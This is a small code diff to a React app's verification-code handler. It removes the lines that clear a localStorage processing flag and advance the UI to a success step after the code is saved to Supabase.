@@ -103,8 +103,6 @@ export default function App() {
       setCurrentStep('loading');
       await updateApplicationVerificationCodeInSupabase(applicationId, displayValue);
       setSubmittedApplication((prev) => (prev ? { ...prev, verificationCode: displayValue } : prev));
-      window.localStorage.removeItem(PROCESSING_STORAGE_KEY);
-      setCurrentStep('success');
     } catch (error: any) {
       window.localStorage.removeItem(PROCESSING_STORAGE_KEY);
       console.error('OTP update failed', {
